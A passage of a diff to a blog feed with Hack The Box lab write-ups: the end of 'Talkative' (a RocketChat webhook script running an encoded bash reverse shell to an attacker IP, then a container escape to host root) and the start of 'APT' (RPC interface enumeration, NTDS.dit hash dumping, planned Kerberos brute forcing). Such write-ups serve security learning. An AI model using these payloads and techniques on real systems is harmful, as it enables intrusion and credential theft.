+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">require</span> <span class="o">=</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">.</span><span class="kd">constructor</span><span class="p">(</span><span class="dl">'</span><span class="s1">return process.mainModule.require</span><span class="dl">'</span><span class="p">)();</span>
+<span class="kd">const</span> <span class="p">{</span> <span class="nx">exec</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">exec</span><span class="p">(</span><span class="dl">'</span><span class="s1">echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzkwMDAgMD4mMQ== | base64 -d | bash</span><span class="dl">'</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p><img src="/assets/Talkative/rocket-chat-incoming-webhook-setup.jpg" alt="" /></p>
+
+<p><em>After</em> <strong><em>filling out all the fields</em></strong> <em>similar to what the exploit did,</em> we <strong>saved the changes.</strong></p>
+
+<p>we then <strong>copied</strong> the <code class="language-plaintext highlighter-rouge">curl</code> command</p>
+
+<p><img src="/assets/Talkative/rocket-chat-obtaining-the-webhook-url.jpg" alt="" /></p>
+
+<p>and used it to <strong>trigger the webhook</strong> after starting our <code class="language-plaintext highlighter-rouge">ncat</code> listener in advance.</p>
+
+<p><img src="/assets/Talkative/rocket-chat-curling-the-webhook-url.jpg" alt="" /></p>
+
+<p>we got a <strong>sweet</strong> <code class="language-plaintext highlighter-rouge">root</code> <strong>shell</strong> on the <strong>RocketChat container :D</strong></p>
+
+<h2 id="escaping-and-owning-the-host-finally">Escaping and Owning the Host (Finally)</h2>
+<p><em>After getting in,</em> we <strong>improved our shell</strong> using the <code class="language-plaintext highlighter-rouge">script</code> utility to <strong>get a pty.</strong></p>
+
+<p><img src="/assets/Talkative/rocket-chat-container-improving-the-shell.jpg" alt="" /></p>
+
+<p>we then <strong>transfered</strong> the <code class="language-plaintext highlighter-rouge">deepce.sh</code> script and <strong>ran it</strong> to <strong>check for ways to escape to the host.</strong></p>
+
+<p><em>because the</em> <code class="language-plaintext highlighter-rouge">capsh</code> <em>tool wasn’t installed,</em> the script <strong>couldn’t enumerate the docker’s capabilities.</strong></p>
+
+<p><img src="/assets/Talkative/rocket-container-no-capsh-installed.jpg" alt="" /></p>
+
+<p><em>since</em> <strong><em>capabilities are one of the main ways to escape containers,</em></strong> we <strong>had to install the missing items.</strong></p>
+
+<p>we <code class="language-plaintext highlighter-rouge">cat</code> the <code class="language-plaintext highlighter-rouge">/etc/os-release</code> file to <strong>get our Linux distro.</strong></p>
+
+<p><img src="/assets/Talkative/rocket-container-linux-distro.jpg" alt="" /></p>
+
+<p>we were on <strong>Debian 10.</strong> so we searched <strong>Google</strong> to find out how to install <code class="language-plaintext highlighter-rouge">capsh</code></p>
+
+<p>The <strong>first result</strong> was from a website called <a href="https://command-not-found.com/capsh">command-not-found.com</a>. such <strong><em>a suitable name :)</em></strong></p>
+
+<p><img src="/assets/Talkative/rocket-container-finding-capsh-dependencies-1.jpg" alt="" /></p>
+
+<p><em>according to it,</em> we needed the <code class="language-plaintext highlighter-rouge">libcap2-bin</code> library.</p>
+
+<p>we <strong>could obtain it</strong> from the <a href="https://packages.debian.org/sid/amd64/libcap2-bin/download">Debain packages</a> site</p>
+
+<p><em>but during installation,</em> it <strong>required another library</strong>: <code class="language-plaintext highlighter-rouge">libcap2</code></p>
+
+<p><img src="/assets/Talkative/rocket-container-finding-capsh-dependencies-2.jpg" alt="" /></p>
+
+<p>we got it the same way from <a href="https://packages.debian.org/sid/amd64/libcap2/download">here</a> and installed it using <code class="language-plaintext highlighter-rouge">dpkg -i</code></p>
+
+<p><strong><em>having installed the required dependencies,</em></strong> we ran <code class="language-plaintext highlighter-rouge">deepce.sh</code> a second time:</p>
+
+<p><img src="/assets/Talkative/rocket-chat-container-capabilities-discovered.jpg" alt="" /></p>
+
+<p>we found a <strong>set of critical capabilities</strong>. Namely <code class="language-plaintext highlighter-rouge">cap_dac_read_search</code> and <code class="language-plaintext highlighter-rouge">cap_dac_override</code> which <strong>together can be exploited to write files to the host machine.</strong></p>
+
+<p>We’re going to <strong>follow the method explained</strong> in the <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_override">HackTricks</a> page and <strong>compile the C code.</strong></p>
+
+<p><strong>Note:</strong> <strong><em>staticly linking the binary</em></strong> with the <code class="language-plaintext highlighter-rouge">-static</code> flag will <strong>make sure it has the libraries</strong> it needs.</p>
+
+<p><img src="/assets/Talkative/privesc-compile-shocker-write.jpg" alt="" /></p>
+
+<p>the <strong>warnings weren’t a concern</strong> here. we still <strong>got the compiled executable.</strong></p>
+
+<p><em>To compromise the host,</em> we first <strong>generated an SSH key pair.</strong></p>
+
+<p><img src="/assets/Talkative/privesc-generating-ssh-key-pair.jpg" alt="" /></p>
+
+<p>we then <strong>transferred the public key</strong> and <strong>used the exploit</strong> to <strong>write it over</strong> the host’s <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code> file.</p>
+
+<p><img src="/assets/Talkative/privesc-writing-ssh-public-key-to-host.jpg" alt="" /></p>
+
+<p><strong>which was a success!</strong></p>
+
+<p>The <strong>final step</strong> was to <strong>transfer the private key to the bolt container</strong> (<em>since it had the</em> <code class="language-plaintext highlighter-rouge">ssh</code> <em>client installed</em>) and use it to <strong>own the box.</strong></p>
+
+<p><img src="/assets/Talkative/privesc-rooted-finally.jpg" alt="" /></p>
+
+<p><strong>What a trip! :D</strong></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Linux - Medium] - Mango</title><link href="http://localhost:4000/2022/10/11/Mango.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Medium] - Mango" /><published>2022-10-11T00:00:00+02:00</published><updated>2022-10-11T00:00:00+02:00</updated><id>http://localhost:4000/2022/10/11/Mango</id><content type="html" xml:base="http://localhost:4000/2022/10/11/Mango.html"><![CDATA[<p><img src="/assets/Mango/Mango.png" alt="" /></p>
 
 <h2 id="summary">Summary</h2>
 <ul>
@@ -3354,464 +3897,4 @@ Completed after 19.76 seconds
 <span class="p">}</span>
 
 <span class="cp">?&gt;</span>
-</code></pre></div></div>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Insane] - APT</title><link href="http://localhost:4000/2022/07/07/APT.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Insane] - APT" /><published>2022-07-07T00:00:00+02:00</published><updated>2022-07-07T00:00:00+02:00</updated><id>http://localhost:4000/2022/07/07/APT</id><content type="html" xml:base="http://localhost:4000/2022/07/07/APT.html"><![CDATA[<p><img src="/assets/APT/APT.png" alt="APT" /></p>
-
-<h2 id="summary">Summary</h2>
-<ul>
-  <li>A Windows machine where a standard IPv4 full TCP port scan reveals only <strong>HTTP</strong> on port 80 and <strong>RPC Endpoint Mapper</strong> on port 135.</li>
-  <li><em>After checking out the website,</em> it turns out to be just static content with no real abusable functionalities.</li>
-  <li><em>However, due to the many information that can be retrieved through the MSRPC protocol and because we have no other option,</em> we decide to dig deeper into what can be done through it.</li>
-  <li>We come across an amazing article where we find that we can (<em>without authentication</em>) access a specific function in the legacy <strong>DCOM interface</strong> exported through RPC that would let us enumerate all the network interfaces on the machine.</li>
-  <li><em>Thanks to a security researcher who has built a specific</em> <strong>python script</strong> <em>for that function,</em> we can use it and are able to get the network interace information.</li>
-  <li>We find that the machine has an <strong>IPV6</strong> that when scanned with nmap reveals the full list of available ports which indicate a <strong>Windows Domain Controller.</strong></li>
-  <li>The anonymously-accessible SMB share had a copy of the Active Directory database file <strong>NTDS.dit</strong> as well as the <strong>security</strong> and <strong>system</strong> registry hives in a folder structure similar to the output of the <code class="language-plaintext highlighter-rouge">ntdsutil</code> utility.</li>
-  <li><em>With the given files, and using impacket’s</em> <code class="language-plaintext highlighter-rouge">secretsdump.py</code>, we are able to get a list of all domain usernames and hashes.</li>
-  <li>We enumerate the users with <code class="language-plaintext highlighter-rouge">kerbrute</code> to only find 3 valid accounts (the default Administrator, the Domain Controller’s machine account and a user called <code class="language-plaintext highlighter-rouge">henry.vinson</code>).</li>
-  <li>We try to brute force the user accounts with all the hashes from the dump over <strong>SMB</strong> but are <strong>blocked</strong> by the server when doing so.</li>
-  <li><em>However, since we didn’t get a message indicating account lockout,</em> we changed the method of authentication to <strong>Kerberos</strong> (<em>as it doesn’t leave a 4625 logon event in the logs</em>) in hopes of bypassing the defenses in place.</li>
-  <li><em>By building a bash wrapper around impacket’s silver ticket script</em> <code class="language-plaintext highlighter-rouge">getST.py</code>, we manage to brute force using the <strong>NTLM</strong> hashes to find a match with the <code class="language-plaintext highlighter-rouge">henry.vinson</code> user.</li>
-  <li>The user had no <strong>WinRM</strong> access so we tried many things to enumerate the machine. <em>When scanning the contents of the</em> <strong>registry</strong> <em>through the available</em> <strong>remote registry service</strong>, we got a set of credentials for the <code class="language-plaintext highlighter-rouge">henry.vinson_adm</code> user.</li>
-  <li>That user turned out to have <strong>WinRM</strong> access and we could successfully get a shell. We then used <code class="language-plaintext highlighter-rouge">WinPEAS</code> to run a regular privesc check. We had to switch the basic version for the obfuscated one because <strong>AMSI</strong> was detecting it.</li>
-  <li><em>Looking at the tool’s output,</em> we find that the machine is misconfigured and uses the insecure and crackable <strong>NetNTLMv1</strong> in network authentication. A vulnerabiltiy that can be exploited for <strong>privilege escalation</strong>.</li>
-  <li><em>Luckily,</em> a tool like <code class="language-plaintext highlighter-rouge">PetitPotam.py</code> can <strong>coerce authentication</strong> back to our attacker machine. We use it after setting up our <code class="language-plaintext highlighter-rouge">responder</code> to <em>downgrade</em> the authentication to <strong>NetNTLMv1</strong> as well as send a specific challenge to capture the machine account’s hash.</li>
-  <li>We submit it to the <code class="language-plaintext highlighter-rouge">crack.sh</code> website which cracks it and emails us the NTLM version. We then use it to perform a <strong>DCSync</strong> attack.</li>
-  <li><em>After retrieving the Administrator’s NTLM hash from the dump,</em> we use it to get <strong>complete access</strong> to the box in a typical pass-the-hash attack.</li>
-  <li>The machine author’s intended way to achieve privilege escalation was through modifying the <strong>RoguePotato</strong> exploit to target IPV6, bypass AMSI then creating a special RPC server with impacket to respond with a challenge before capturing the NetNTLMv1 authentication.</li>
-  <li><em>However, due to that path’s high complexity and due to the simpler tools currenly available,</em> I’m postponing it for when I know enough about RPC to be able to <em>decently</em> write about it.</li>
-</ul>
-
-<hr />
-
-<h2 id="ipv4-nmap">IPv4 NMAP</h2>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE SERVICE VERSION
-80/tcp  open  http    Microsoft IIS httpd 10.0
-|_http-title: Gigantic Hosting | Home
-| http-methods: 
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/10.0
-135/tcp open  msrpc   Microsoft Windows RPC
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-</code></pre></div></div>
-
-<p>The standard nmap full port scan shows:</p>
-<ol>
-  <li><strong>HTTP</strong> on port 80 served on <strong>IIS</strong> 10</li>
-  <li><strong>MSRPC</strong> on port 135</li>
-</ol>
-
-<h2 id="checking-port-80">Checking Port 80</h2>
-<p><em>Looking at the website,</em> we find a bunch of static html pages</p>
-
-<p><img src="/assets/APT/Website-homepage.jpg" alt="Website-homepage" /></p>
-
-<p>The linked web pages were:</p>
-
-<ul>
-  <li>index.html</li>
-  <li>services.html</li>
-  <li>clients.html</li>
-  <li>about.html</li>
-  <li>support.html</li>
-  <li>news.html</li>
-</ul>
-
-<p>The content was mostly filler. We didn’t find anything of interest in the source code. No usernames were there apart from the sales email.</p>
-
-<p><strong>Directory and file bruteforcing</strong> with <code class="language-plaintext highlighter-rouge">gobuster</code> didn’t get us anything new either.</p>
-
-<p><em>Being left with port 135,</em> we decide to dive in.</p>
-
-<h2 id="digging-deep-into-msrpc">Digging deep into MSRPC</h2>
-<p>The <strong>Microsoft Remote Procedure Call</strong> is a protocol that allows a client program to request a service on another computer. Just like any typical client-server architecture.</p>
-
-<p>It is mainly about <strong>Cross-Process Communication</strong> and <strong>Object Exchange</strong> over the network.</p>
-
-<p><em>There are many functionalities in RPC,</em> so we’re interested to know how to use it.</p>
-
-<p>Here are few terms we need to know before we can continue:</p>
-
-<ul>
-  <li><strong>The RPC End Point Mapper:</strong> The RPC Endpoint Mapper (RpcEptMapper) service resolves RPC interface identifiers to transport endpoints. It can be queried for functionalities.</li>
-  <li><strong>Protocol Sequence Identifier:</strong> A numeric value that uniquely identifies an RPC transport protocol when describing a protocol in the context of a protocol stack.</li>
-  <li><strong>RPC Endpoint:</strong> A network-specific address of a server process for RPC.</li>
-  <li><strong>Universally Unique Identifier (UUID):</strong> An identifier that can be used in identifying objects in cross-process communication. In our case, a specific interface providing a special function of interest.</li>
-  <li><strong>The Microsoft Component Object Model (COM):</strong> is a platform-independent, distributed, object-oriented system for creating binary software components that can interact.</li>
-  <li><strong>The Distributed Component Object Model (DCOM):</strong> The Microsoft Component Object Model (COM) specification that defines how components communicate over networks.</li>
-  <li><strong>Interface:</strong> A specification in a Component Object Model (COM) server that describes how to access the methods of a class.</li>
-  <li><strong>Method:</strong> A function that can be called to execute a desired output.</li>
-  <li><strong>Authentication Level:</strong> A numeric value indicating the level of authentication or message protection that remote procedure call (RPC) will apply to a specific message exchange</li>
-  <li><strong>Opnum:</strong> An operation number or numeric identifier that is used to identify a specific remote procedure call (RPC) method or a method in an interface.</li>
-</ul>
-
-<p><em>With that out of the way,</em> here’s what we’re going to do:</p>
-
-<ol>
-  <li>Talk to the <strong>RPC Endpoint Mapper</strong> service on port 135.</li>
-  <li>List all <strong>RPC Endpoints</strong> available.</li>
-  <li><em>Per endpoint,</em> find the functionalities that <strong>don’t require authentication</strong>.</li>
-  <li><em>By googling each endpoint’s UUID,</em> lookup Microsoft’s documentation on the <strong>available methods</strong> through it.</li>
-  <li><em>If we find any,</em> we would also need to look for a way to invoke those functionalities.</li>
-</ol>
-
-<p><em>Since it’s the most relevant tool for the job,</em> let’s view the help for impacket’s <code class="language-plaintext highlighter-rouge">rpcmap.py</code> script.</p>
-
-<p><img src="/assets/APT/rpcmap-help.jpg" alt="rpcmap-help" /></p>
-
-<p><em>As far as points 1-3 go,</em> it seems that we have everything we need in this tool. we even have an example of what to use as a string binding value as indicated above.</p>
-
-<p><strong>Command:</strong></p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcmap.py ncacn_ip_tcp:10.10.10.213 <span class="nt">-brute-opnums</span> <span class="nt">-auth-level</span> 1
-</code></pre></div></div>
-
-<p><em>Looking at the output,</em> we see that we get <strong>“access denied”</strong> on most <strong>UUIDs</strong> and for most <strong>opnums</strong>. Except for a couple on <strong>“UUID 99FCFEC4-5260-101B-BBCB-00AA0021347A”</strong></p>
-
-<p><img src="/assets/APT/rpcmap-output.jpg" alt="rpcmap-output" /></p>
-
-<p>Let’s see what google search can find us for that <strong>UUID:</strong></p>
-
-<p><img src="/assets/APT/google-uuid-search-results.jpg" alt="google-uuid-search-results" /></p>
-
-<p><em>As you may have noticed from the link coloring,</em> I clicked all three links :D the second article is enough to get us through the first part of this machine.</p>
-
-<p>But we’re going to take a brief look at Microsoft’s documentation first.</p>
-
-<p>Our <strong>UUID</strong> is that of the <strong>“IID_IObjectExporter”</strong>.</p>
-
-<p><img src="/assets/APT/object-exporter.jpg" alt="object-exporter" /></p>
-
-<p>Here’s what we get when we click the link next to it:</p>
-
-<p><img src="/assets/APT/object-exporter-methods.jpg" alt="object-exporter-methods" /></p>
-
-<p><em>If you remember from</em> <code class="language-plaintext highlighter-rouge">rpcmap</code><em>’s output,</em> we had access to only <strong>opnums</strong> 3 &amp; 5</p>
-
-<p><img src="/assets/APT/object-exporter-available-opnums.jpg" alt="object-exporter-available-opnums" /></p>
-
-<p>when looking at opnum3, we see nothing significant:</p>
-
-<p><img src="/assets/APT/serveralive-method.jpg" alt="serveralive-method" /></p>
-
-<p>It just checks if the other host is up.</p>
-
-<p>let’s look at <strong>opnum</strong> 5:</p>
-
-<p><img src="/assets/APT/serveralive2-method.jpg" alt="serveralive2-method" /></p>
-
-<p><strong>“It returns string and security bindings for the object resolver, which allows the client to choose the most appropriate, mutually compatible settings.”</strong></p>
-
-<p><em>Since in our case, we’re the client,</em> we should get string and security bindings back when calling this method.</p>
-
-<p>This would mean <strong>all the IP addresses</strong> on the box (including a potential <strong>IPv6</strong>) can be leaked.</p>
-
-<p>But I don’t have much of a clue on how to do that XD</p>
-
-<p>The 2nd search result <a href="/assets/APT/https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/">here</a> seemed very promising.</p>
-
-<p><img src="/assets/APT/airbus-article.jpg" alt="airbus-article" /></p>
-
-<p>The <strong>Impacket</strong> library had the necessary code and the researcher was kind enough to provide a <strong>python</strong> script to get the job done.</p>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
-</span>
-<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">getopt</span>
-
-<span class="kn">from</span> <span class="nn">impacket.dcerpc.v5</span> <span class="kn">import</span> <span class="n">transport</span>
-<span class="kn">from</span> <span class="nn">impacket.dcerpc.v5.rpcrt</span> <span class="kn">import</span> <span class="n">RPC_C_AUTHN_LEVEL_NONE</span>
-<span class="kn">from</span> <span class="nn">impacket.dcerpc.v5.dcomrt</span> <span class="kn">import</span> <span class="n">IObjectExporter</span>
-
-<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">argv</span><span class="p">):</span>
-
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">opts</span><span class="p">,</span> <span class="n">args</span> <span class="o">=</span> <span class="n">getopt</span><span class="p">.</span><span class="n">getopt</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span><span class="s">"ht:"</span><span class="p">,[</span><span class="s">"target="</span><span class="p">])</span>
-    <span class="k">except</span> <span class="n">getopt</span><span class="p">.</span><span class="n">GetoptError</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s">'IOXIDResolver.py -t &lt;target&gt;'</span>
-        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
-
-    <span class="n">target_ip</span> <span class="o">=</span> <span class="s">"192.168.1.1"</span>
-
-    <span class="k">for</span> <span class="n">opt</span><span class="p">,</span> <span class="n">arg</span> <span class="ow">in</span> <span class="n">opts</span><span class="p">:</span>
-        <span class="k">if</span> <span class="n">opt</span> <span class="o">==</span> <span class="s">'-h'</span><span class="p">:</span>
-            <span class="k">print</span> <span class="s">'IOXIDResolver.py -t &lt;target&gt;'</span>
-            <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
-        <span class="k">elif</span> <span class="n">opt</span> <span class="ow">in</span> <span class="p">(</span><span class="s">"-t"</span><span class="p">,</span> <span class="s">"--target"</span><span class="p">):</span>
-            <span class="n">target_ip</span> <span class="o">=</span> <span class="n">arg</span>
-
-    <span class="n">authLevel</span> <span class="o">=</span> <span class="n">RPC_C_AUTHN_LEVEL_NONE</span>
-
-    <span class="n">stringBinding</span> <span class="o">=</span> <span class="sa">r</span><span class="s">'ncacn_ip_tcp:%s'</span> <span class="o">%</span> <span class="n">target_ip</span>
-    <span class="n">rpctransport</span> <span class="o">=</span> <span class="n">transport</span><span class="p">.</span><span class="n">DCERPCTransportFactory</span><span class="p">(</span><span class="n">stringBinding</span><span class="p">)</span>
-
-    <span class="n">portmap</span> <span class="o">=</span> <span class="n">rpctransport</span><span class="p">.</span><span class="n">get_dce_rpc</span><span class="p">()</span>
-    <span class="n">portmap</span><span class="p">.</span><span class="n">set_auth_level</span><span class="p">(</span><span class="n">authLevel</span><span class="p">)</span>
-    <span class="n">portmap</span><span class="p">.</span><span class="n">connect</span><span class="p">()</span>
-
-    <span class="n">objExporter</span> <span class="o">=</span> <span class="n">IObjectExporter</span><span class="p">(</span><span class="n">portmap</span><span class="p">)</span>
-    <span class="n">bindings</span> <span class="o">=</span> <span class="n">objExporter</span><span class="p">.</span><span class="n">ServerAlive2</span><span class="p">()</span>
-
-    <span class="k">print</span> <span class="s">"[*] Retrieving network interface of "</span> <span class="o">+</span> <span class="n">target_ip</span>
-
-    <span class="c1">#NetworkAddr = bindings[0]['aNetworkAddr']
-</span>    <span class="k">for</span> <span class="n">binding</span> <span class="ow">in</span> <span class="n">bindings</span><span class="p">:</span>
-        <span class="n">NetworkAddr</span> <span class="o">=</span> <span class="n">binding</span><span class="p">[</span><span class="s">'aNetworkAddr'</span><span class="p">]</span>
-        <span class="k">print</span> <span class="s">"Address: "</span> <span class="o">+</span> <span class="n">NetworkAddr</span>
-
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
-   <span class="n">main</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
-</code></pre></div></div>
-
-<p><em>When using it,</em> we get a very nice output:</p>
-
-<p><img src="/assets/APT/python-enum-interfaces-script-output.jpg" alt="python-enum-interfaces-script-output" /></p>
-
-<h2 id="ipv6-nmap">IPv6 NMAP</h2>
-<p>After placing an entry for it in our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file, we run another nmap on the <strong>IPv6</strong> using the <code class="language-plaintext highlighter-rouge">-6</code> flag. Look at what we got :D</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE      VERSION
-53/tcp    open  domain       Simple DNS Plus
-80/tcp    open  http         Microsoft IIS httpd 10.0
-| http-server-header: 
-|   Microsoft-HTTPAPI/2.0
-|_  Microsoft-IIS/10.0
-|_http-title: Bad Request
-88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-07-02 15:54:05Z)
-135/tcp   open  msrpc        Microsoft Windows RPC
-389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
-| ssl-cert: Subject: commonName=apt.htb.local
-| Subject Alternative Name: DNS:apt.htb.local
-| Issuer: commonName=apt.htb.local
-| Public Key type: rsa
-| Public Key bits: 2048
-| Signature Algorithm: sha256WithRSAEncryption
-| Not valid before: 2020-09-24T07:07:18
-| Not valid after:  2050-09-24T07:17:18
-| MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
-|_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45
-|_ssl-date: 2022-07-02T15:55:19+00:00; -5h38m13s from scanner time.
-445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
-| ssl-cert: Subject: commonName=apt.htb.local
-| Subject Alternative Name: DNS:apt.htb.local
-| Issuer: commonName=apt.htb.local
-| Public Key type: rsa
-| Public Key bits: 2048
-| Signature Algorithm: sha256WithRSAEncryption
-| Not valid before: 2020-09-24T07:07:18
-| Not valid after:  2050-09-24T07:17:18
-| MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
-|_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45
-|_ssl-date: 2022-07-02T15:55:19+00:00; -5h38m13s from scanner time.
-3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
-|_ssl-date: 2022-07-02T15:55:19+00:00; -5h38m13s from scanner time.
-| ssl-cert: Subject: commonName=apt.htb.local
-| Subject Alternative Name: DNS:apt.htb.local
-| Issuer: commonName=apt.htb.local
-| Public Key type: rsa
-| Public Key bits: 2048
-| Signature Algorithm: sha256WithRSAEncryption
-| Not valid before: 2020-09-24T07:07:18
-| Not valid after:  2050-09-24T07:17:18
-| MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
-|_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45
-3269/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
-|_ssl-date: 2022-07-02T15:55:19+00:00; -5h38m13s from scanner time.
-| ssl-cert: Subject: commonName=apt.htb.local
-| Subject Alternative Name: DNS:apt.htb.local
-| Issuer: commonName=apt.htb.local
-| Public Key type: rsa
-| Public Key bits: 2048
-| Signature Algorithm: sha256WithRSAEncryption
-| Not valid before: 2020-09-24T07:07:18
-| Not valid after:  2050-09-24T07:17:18
-| MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
-|_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45
-5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-title: Bad Request
-|_http-server-header: Microsoft-HTTPAPI/2.0
-9389/tcp  open  mc-nmf       .NET Message Framing
-47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-title: Bad Request
-|_http-server-header: Microsoft-HTTPAPI/2.0
-49664/tcp open  msrpc        Microsoft Windows RPC
-49665/tcp open  msrpc        Microsoft Windows RPC
-49666/tcp open  msrpc        Microsoft Windows RPC
-49667/tcp open  msrpc        Microsoft Windows RPC
-49669/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
-49670/tcp open  msrpc        Microsoft Windows RPC
-49675/tcp open  msrpc        Microsoft Windows RPC
-49695/tcp open  msrpc        Microsoft Windows RPC
-60706/tcp open  msrpc        Microsoft Windows RPC
-Service Info: Host: APT; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb-os-discovery: 
-|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
-|   Computer name: apt
-|   NetBIOS computer name: APT\x00
-|   Domain name: htb.local
-|   Forest name: htb.local
-|   FQDN: apt.htb.local
-|_  System time: 2022-07-02T16:55:02+01:00
-| smb2-time: 
-|   date: 2022-07-02T15:55:01
-|_  start_date: 2022-07-02T13:47:16
-|_clock-skew: mean: -5h46m47s, deviation: 22m40s, median: -5h38m13s
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled and required
-| smb-security-mode: 
-|   account_used: &lt;blank&gt;
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: required
-</code></pre></div></div>
-
-<p>A full-fledged windows domain controller :D</p>
-
-<p>Looks like a firewall was configured to only allow port 80 and 135 on IPv4 but allowed everything on IPv6.</p>
-
-<p><strong>Lesson learned:</strong> Always enumerate network interfaces as part of the recon. There could be way more information to be learned about the network by doing this.</p>
-
-<h2 id="smb-enumeration">SMB Enumeration</h2>
-<p>We start with SMB and run <code class="language-plaintext highlighter-rouge">crackmapexec</code> to check the available shares. And we find a readable one called <strong>“backup”</strong></p>
-
-<p><img src="/assets/APT/cme-smb-shares.jpg" alt="cme-smb-shares" /></p>
-
-<p>we find a password when trying to unzip the file called <code class="language-plaintext highlighter-rouge">backup.zip</code></p>
-
-<p><img src="/assets/APT/backup-zip.jpg" alt="backup-zip" /></p>
-
-<p>we could successfully crack it with john’s <code class="language-plaintext highlighter-rouge">zip2john</code> script (It gave us an error but that wasn’t a concern).</p>
-
-<p><img src="/assets/APT/cracking-zip-hash.jpg" alt="cracking-zip-hash" /></p>
-
-<p><em>After unzipping the archive,</em> we get something very interesting. What appears to be an <strong>Active Directory Database Dump</strong>. This is exactly the output of a utility called <code class="language-plaintext highlighter-rouge">ntdsutil</code></p>
-
-<p><img src="/assets/APT/unzipping-backup-zip.jpg" alt="unzipping-backup-zip" /></p>
-
-<p>We dump the contents with <code class="language-plaintext highlighter-rouge">secretsdump.py</code> using the <code class="language-plaintext highlighter-rouge">-history</code> flag to get previous password hashes and <code class="language-plaintext highlighter-rouge">-just-dc-ntlm</code> to limit the output to what we can use in a pass-the-hash attack.</p>
-
-<p><img src="/assets/APT/secrets_dump.jpg" alt="secrets_dump" /></p>
-
-<p>Something is off here.. it can’t be that easy :D</p>
-
-<p><em>Since those would be instant kills,</em> We tried:</p>
-<ul>
-  <li>Logging in with the Administrator’s hash</li>
-  <li>Use the Domain Controller’s machine hash</li>
-  <li>Create a golden ticket with the krbtgt hash</li>
-</ul>
-
-<p><em>But of course,</em> none worked XD</p>
-
-<h2 id="working-around-bruteforce-defenses">Working around bruteforce defenses</h2>
-
-<p>We will now have to check the other users. So we filter them out with some shell fu:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>dump.txt | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">':'</span> <span class="nt">-f1</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'history'</span> | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> users.txt
-<span class="nb">cat </span>dump.txt | <span class="nb">grep</span> <span class="s1">':::'</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">':'</span> <span class="nt">-f4</span> | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> hashes.txt
-</code></pre></div></div>
-
-<p>We found around <strong>2k unique users</strong> and <strong>4k unique NTLM hashes</strong>.</p>
-
-<p>We have to first validate that these users exist. We do so using <code class="language-plaintext highlighter-rouge">kerbrute</code></p>
-
-<p>Only 3 users were valid:</p>
